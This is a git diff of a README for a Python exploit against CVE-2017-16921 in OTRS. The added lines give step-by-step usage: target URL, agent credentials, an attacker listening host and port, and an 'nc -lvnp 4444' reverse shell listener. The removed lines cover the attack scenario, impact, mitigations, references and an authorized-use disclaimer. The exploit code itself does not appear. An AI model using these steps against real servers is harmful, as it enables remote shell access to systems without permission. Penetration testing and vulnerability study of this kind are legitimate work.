@@ -103,98 +103,50 @@ Install dependencies:
 
 ```bash
 
-pip3 install requests
+## Requirements
 
-Usage
+The exploit requires:
+
+- Python 3.x
+- Python `requests` module
+- Valid **OTRS agent credentials**
+- Network access to the target server
+
+Install dependencies:
+
+```bash
+pip3 install requests
+```
+
+---
+
+## Usage
 
 Run the exploit script:
 
+```bash
 python3 CVE-2017-16921.py
+```
 
 Example usage:
 
+```bash
 python3 CVE-2017-16921.py \
 --url http://target/otrs/index.pl \
 --username agent_user \
 --password password \
 --lhost 10.10.14.5 \
 --lport 4444
+```
 
-Reverse Shell Listener
+---
+
+## Reverse Shell Listener
 
 Before executing the exploit, start a listener:
 
+```bash
 nc -lvnp 4444
+```
+
 If exploitation is successful, the target server will connect back to your listener.
-
-Example Attack Scenario
-
-Attacker obtains valid OTRS agent credentials.
-
-The exploit logs into the OTRS agent interface.
-
-A malicious payload is injected through the PGP configuration form.
-
-The server executes the injected shell command.
-
-A reverse shell connection is established.
-
-Impact
-
-Successful exploitation may allow an attacker to:
-
-Execute arbitrary OS commands
-
-Read sensitive files
-
-Access internal systems
-
-Pivot within the network
-
-Potentially escalate privileges
-
-Mitigation
-
-To protect against this vulnerability:
-
-Upgrade OTRS to a patched version
-
-Restrict access to the agent interface
-
-Apply strong authentication policies
-
-Monitor logs for suspicious activity
-
-Use network segmentation
-
-References
-
-Exploit‑DB
-https://www.exploit-db.com/exploits/43853
-
-MITRE CVE
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16921
-
-OTRS Security Advisory
-https://www.otrs.com/security-advisory
-
-Credits
-
-Hex_26 – ChallengeToken retrieval implementation
-
-Bæln0rn – Original exploit research
-
-SmarttFoxx – Adaptation and Python implementation
-
-Disclaimer
-
-This project is intended for educational purposes and authorized security testing only.
-
-The author is not responsible for misuse or illegal activities performed using this code.
-
-Always obtain explicit permission before testing security vulnerabilities.
-
-⭐ If you find this project useful, consider giving it a star.
-
-
-----
